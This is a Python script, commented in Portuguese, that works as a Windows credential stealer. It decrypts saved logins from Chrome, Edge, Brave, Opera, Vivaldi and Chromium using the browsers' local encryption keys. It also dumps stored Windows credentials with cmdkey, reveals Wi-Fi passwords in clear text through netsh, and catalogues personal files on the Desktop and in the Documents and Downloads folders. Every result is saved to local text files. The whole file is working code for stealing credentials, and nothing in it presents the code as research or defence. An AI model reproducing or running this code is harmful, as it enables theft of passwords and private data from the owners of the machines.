import os
import subprocess
import sqlite3
import base64
import json
import shutil
import win32crypt
from Cryptodome.Cipher import AES
from pathlib import Path

# Caminhos padrão dos navegadores Chromium
NAVEGADORES = {
    "Chrome": os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data"),
    "Edge": os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data"),
    "Brave": os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.join(os.environ["APPDATA"], r"Opera Software\Opera Stable"),
    "OperaGX": os.path.join(os.environ["APPDATA"], r"Opera Software\Opera GX Stable"),
    "Vivaldi": os.path.join(os.environ["LOCALAPPDATA"], r"Vivaldi\User Data"),
    "Chromium": os.path.join(os.environ["LOCALAPPDATA"], r"Chromium\User Data"),
}

def get_encryption_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except:
            return "Erro ao descriptografar"

def salvar_senhas_navegadores():
    with open("senhas_navegadores.txt", "w", encoding="utf-8") as f:
        for nome, path in NAVEGADORES.items():
            default_path = os.path.join(path, "Default")
            login_db = os.path.join(default_path, "Login Data")
            if not os.path.exists(login_db):
                continue
            try:
                f.write(f"==== {nome} ====\n")
                key = get_encryption_key(path)
                if not key:
                    f.write("Chave de criptografia não encontrada.\n\n")
                    continue

                temp_db = f"{nome}_login_temp.db"
                shutil.copyfile(login_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for url, user, pwd in cursor.fetchall():
                    senha = decrypt_password(pwd, key)
                    f.write(f"Site: {url}\nUsuário: {user}\nSenha: {senha}\n\n")

                conn.close()
                os.remove(temp_db)
            except Exception as e:
                f.write(f"Erro no {nome}: {e}\n\n")

def salvar_credenciais_windows():
    try:
        output = subprocess.check_output("cmdkey /list", shell=True, text=True)
        with open("credenciais_windows.txt", "w", encoding="utf-8") as f:
            f.write(output)
    except Exception as e:
        with open("credenciais_windows.txt", "w") as f:
            f.write(f"Erro: {e}")

def salvar_senhas_wifi():
    output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
    redes = [line.split(":")[1].strip() for line in output.splitlines() if "Todos os Perfis" in line]
    with open("senhas_wifi.txt", "w", encoding="utf-8") as f:
        for rede in redes:
            result = subprocess.run(f'netsh wlan show profile name="{rede}" key=clear', shell=True, capture_output=True, text=True)
            f.write(f"===== {rede} =====\n")
            f.write(result.stdout + "\n")

def listar_arquivos_pessoais():
    paths = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads")
    ]
    with open("arquivos_pessoais.txt", "w", encoding="utf-8") as f:
        for path in paths:
            f.write(f"\n==== Arquivos em {path} ====\n")
            for root, _, files in os.walk(path):
                for file in files:
                    full_path = os.path.join(root, file)
                    f.write(full_path + "\n")

def main():
    print("⏳ Extraindo dados de todos os navegadores Chromium...")
    salvar_senhas_navegadores()
    salvar_credenciais_windows()
    salvar_senhas_wifi()
    listar_arquivos_pessoais()
    print("✅ Extração finalizada. Arquivos salvos na mesma pasta.")

if __name__ == "__main__":
    main()
